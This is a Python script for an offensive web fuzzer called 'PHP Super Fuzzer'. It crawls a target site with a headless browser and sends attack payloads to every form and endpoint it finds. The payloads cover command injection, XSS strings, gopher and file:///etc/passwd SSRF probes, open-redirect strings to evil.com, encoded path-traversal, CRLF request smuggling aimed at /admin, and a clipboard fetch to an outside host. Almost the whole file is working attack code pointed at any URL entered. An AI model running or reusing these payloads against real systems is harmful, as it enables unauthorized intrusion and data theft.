#!/usr/bin/env python3
"""
═══════════════════════════════════════════════════════════════════════════
                      P H P  •  S U P E R  •  F U Z Z E R
                                 ( v5 )
                            Haroon Ahmad Awan
═══════════════════════════════════════════════════════════════════════════
• Dynamic SPA crawler (Angular / React / Vue / Lit / Next / Svelte / HTMX)
• Discovers:
      – DOM links / router‑links / hash‑routes
      – XHR / fetch / GraphQL / REST / Web‑socket endpoints
      – Hidden iframes & Shadow‑DOM nodes
      – All HTML forms (GET & POST)  →  auto‑fuzz fields
• Fully‑loaded attack arsenal:
      – Multi‑stage param recursion  –  Protocol‑scheme (gopher/file/data/blob)
      – Split‑eval chain & header/body smuggling (CRLF / chunk‑desync)
      – Legacy unicode / double‑encode bypass
      – MIME‑type confusion, multipart boundary smashing, php://input RCE
      – JS prototype‑pollution, ShadowDOM, MutationObserver, clipboard hijack
      – Web‑socket XSS, async/await race, iframe sandbox clone
      – AI‑style payload mutation (simple reversible/encode scramble)
• Hardened Playwright loader (timeout+retry+HTTPS ignore)
• Windows‑safe UTF‑8 logger  →  `super_fuzz.log`
═══════════════════════════════════════════════════════════════════════════
"""

import requests, socket, time, json, random, contextlib
from pathlib import Path
from collections import deque
from urllib.parse import urlparse, urljoin, quote, urlencode
from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout

# ─── constants ──────────────────────────────────────────────────────────
PAGE_TIMEOUT = 30_000      # ms
RETRIES      = 1
LOG_FILE     = Path("super_fuzz.log")
LOG_FILE.write_text("", encoding="utf-8")      # reset

# ─── logger ─────────────────────────────────────────────────────────────
def log(msg, tag="*",):
    line = f"[{tag}] {msg}"
    try:
        print(line)
    except UnicodeEncodeError:            # Windows CP‑1252 safe
        print(line.encode("ascii","ignore").decode())
    with open(LOG_FILE, "a", encoding="utf-8") as fp:
        fp.write(line + "\n")

# ─── Playwright loader ─────────────────────────────────────────────────
# ─── Playwright loader (replace old open_page) ──────────────────────────
def open_page(p, url, timeout=PAGE_TIMEOUT, retries=RETRIES):
    """
    Attempt to navigate; on ANY failure return (None, None, None)
    so caller can safely `continue`.
    """
    for a in range(retries + 1):
        try:
            br = p.chromium.launch(headless=True, args=["--disable-web-security"])
            ctx = br.new_context(ignore_https_errors=True)
            pg  = ctx.new_page()
            pg.goto(url, timeout=timeout)
            return br, ctx, pg
        except Exception as e:                           # <- catch all
            log(f"Playwright fail ({a+1}/{retries+1}) – {url} – {e}", "!")
            with contextlib.suppress(Exception):
                br.close()
    return None, None, None

# ╭────────────────────  SMART SPA / API / FORM CRAWLER  ───────────────╮ #
def smart_crawl(seed, p, max_depth=2, same_origin=True):
    origin = "{0.scheme}://{0.netloc}".format(urlparse(seed))
    discovered, queued = {seed}, deque([(seed,0)])
    endpoints = set()

    while queued:
        current, depth = queued.popleft()
        if depth > max_depth: continue

        br, ctx, page = open_page(p, current)
        if not page:   continue

        # track dynamic requests (XHR / fetch / WS)
        page.on("request", lambda req, s=endpoints: s.add(req.url))

        # detect all forms
        forms = page.query_selector_all("form")
        for f in forms:
            action = f.get_attribute("action") or current
            method = (f.get_attribute("method") or "get").lower()
            inputs = [i.get_attribute("name") or "p" for i in f.query_selector_all("input,textarea,select")]
            endpoints.add(urljoin(current, action))
            fuzz_html_form(urljoin(current, action), method, inputs)

        # wait for network idle, then collect links
        with contextlib.suppress(PWTimeout):
            page.wait_for_load_state("networkidle", timeout=6000)

        links = page.evaluate("""() => Array.from(
             document.querySelectorAll('[href],[routerLink],a'))
             .map(e=>e.href || e.getAttribute('href') || e.getAttribute('routerLink'))""")

        br.close()
        for raw in set(links):
            if not raw: continue
            url = urljoin(current, raw)
            if same_origin and not url.startswith(origin): continue
            if url not in discovered:
                discovered.add(url); queued.append((url, depth+1))

    log(f"Crawler → {len(discovered)} pages, {len(endpoints)} API/form endpoints", "+")
    return discovered | endpoints
# ╰──────────────────────────────────────────────────────────────────────╯ #

# ╭────────────────────  FORM‑FUZZ HELPER  ──────────────────────────────╮ #
def ai_mutate(s):         # lightweight obfuscator
    variants=[s[::-1], quote(s), s.replace(" ","%20"), ''.join(random.sample(s,len(s)))]
    return random.choice(variants)

def fuzz_html_form(action, method, fields):
    sample = {"id": "whoami", "q": "<svg/onload=alert(1)>", "pwn": "gopher://127.0.0.1/"}
    data   = {f: ai_mutate(random.choice(list(sample.values()))) for f in fields}
    try:
        if method=="post":
            r=requests.post(action, data=data, timeout=5)
        else:
            r=requests.get(action+"?"+urlencode(data, doseq=True), timeout=5)
        hit = any(k in r.text for k in ("uid=","root:","<svg","alert("))
        if hit: log(f"Form endpoint vulnerable → {action}", "✓")
    except requests.RequestException: pass
# ╰──────────────────────────────────────────────────────────────────────╯ #

# ╭────────────────────  SERVER‑SIDE ATTACKS  ───────────────────────────╮ #
def recursive_param(u):
    for t in ["?x=http://evil.com?y=whoami","?next=/dash?redir=//evil","?url=http://v/?c=id"]:
        try:
            r=requests.get(u+t,timeout=5)
            if any(k in r.text for k in("uid=","root:")): log("Param recursion "+u+t,"✓")
        except: pass

def protocol_abuse(u):
    for p in ["gopher://127.0.0.1:11211/_stats","file:///etc/passwd",
              "data:text/html,<img src=x onerror=alert(9)>","blob:http://localhost"]:
        try:
            r=requests.get(u+"?p="+quote(p),timeout=5)
            if any(k in r.text for k in("uid=","root:")): log("Protocol "+p,"✓")
        except: pass

def split_eval(u):
    for f in ['";alert','("XSS")']:
        try:
            if "<script" in requests.get(u+"?q="+quote(f)).text: log("Split‑eval "+f,"✓")
        except: pass

def mime_confuse(u):
    with contextlib.suppress(Exception):
        if "<script" in requests.post(u,"<script>alert`1`</script>",
                                      headers={"Content-Type":"application/json"}).text:
            log("MIME confusion ✓","✓")

def unicode_path(u):
    for e in ("%252e%252e","%c0%ae%c0%ae","%u202e"):
        with contextlib.suppress(Exception):
            if "root" in requests.get(f"{u}/{e}/").text: log("Unicode bypass "+e,"✓")

def crlf_smuggle(host):
    pay=(f"GET / HTTP/1.1\r\nHost:{host}\r\nX:1\r\n\r\nPOST /admin HTTP/1.1\r\n\r\n")
    with contextlib.suppress(Exception):
        sock=socket.create_connection((host,80),timeout=3)
        sock.sendall(pay.encode()); sock.close(); log("CRLF smuggle probe","+")
# ╰──────────────────────────────────────────────────────────────────────╯ #

# ╭────────────────────  CLIENT / DOM ATTACKS  ──────────────────────────╮ #
def dom_clipboard(u,p):
    br,_,pg=open_page(p,u); 
    if pg:
        pg.evaluate("""document.body.innerHTML+='<input oncopy=fetch("http://dns.x")>'""")
        log("Clipboard payload ✓","✓"); br.close()

def dom_ppollute(u,p):
    br,_,pg=open_page(p,u); 
    if pg:
        pg.on("console",lambda m:"[PP]"in m.text and log("Prototype polluted","✓"))
        pg.evaluate("""let e=JSON.parse('{"__proto__":{"polluted":"yes"}}');Object.assign({},e);
                        console.log('[PP]'+{}.polluted)"""); br.close()

def dom_ws(u,p):
    br,_,pg=open_page(p,u)
    if pg:
        pg.on("console",lambda m:"[WS]"in m.text and log("WS echo ✓","✓"))
        pg.evaluate("""let w=new WebSocket("wss://echo.websocket.events");
                       w.onopen=()=>w.send("<svg/onload=alert(2)>");
                       w.onmessage=e=>console.log("[WS]"+e.data)""")
        time.sleep(1.3); br.close()

def dom_async(u,p):
    br,_,pg=open_page(p,u)
    if pg:
        pg.evaluate("""(async()=>{let x=await new Promise(r=>setTimeout(()=>r('alert(7)'),150));eval(x)})();""")
        log("Async race ✓","✓"); br.close()

def dom_iframe(u,p):
    br,_,pg=open_page(p,u)
    if pg:
        pg.evaluate("""let f=document.createElement('iframe');f.srcdoc='<script>alert(99)</script>';
                       document.body.appendChild(f)"""); log("Iframe clone ✓","✓"); br.close()
# ╰──────────────────────────────────────────────────────────────────────╯ #

# ╭─────────────────────────────  MASTER  ───────────────────────────────╮ #
def run(seed):
    host=urlparse(seed).hostname or seed
    log(f"Seed → {seed}","◆")

    with sync_playwright() as p:
        scope=smart_crawl(seed,p,max_depth=2)
    for u in scope:
        recursive_param(u); protocol_abuse(u); split_eval(u)
        mime_confuse(u); unicode_path(u)
    crlf_smuggle(host)

    with sync_playwright() as p:
        dom_clipboard(seed,p); dom_ppollute(seed,p)
        dom_ws(seed,p); dom_async(seed,p); dom_iframe(seed,p)

    log("SUPER‑FUZZ COMPLETE","◆")
# ╰──────────────────────────────────────────────────────────────────────╯ #

if __name__=="__main__":
    try: run(input("Target URL: ").strip())
    except KeyboardInterrupt: log("Interrupted","!")
